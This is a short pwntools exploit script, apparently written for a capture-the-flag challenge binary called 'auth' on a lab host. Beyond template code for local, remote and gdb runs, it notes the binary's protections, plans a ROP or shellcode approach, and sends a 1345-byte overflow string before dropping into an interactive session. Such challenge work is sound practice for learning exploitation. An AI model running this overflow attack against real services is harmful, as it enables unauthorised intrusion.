#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context.clear(arch='amd64')
exe = context.binary = ELF('auth')

host = args.HOST or '10.67.0.1'
port = int(args.PORT or 31445)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

"""
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

As we have NX enabled, probably we need a ROP approach
Then we will call system or mmap a memory space for a shellcode
"""

# -- Exploit goes here --
io = start()

io.recvline()
# send chars to fill the buffer plus one more <3
io.sendline("A" * 1345)

io.interactive()

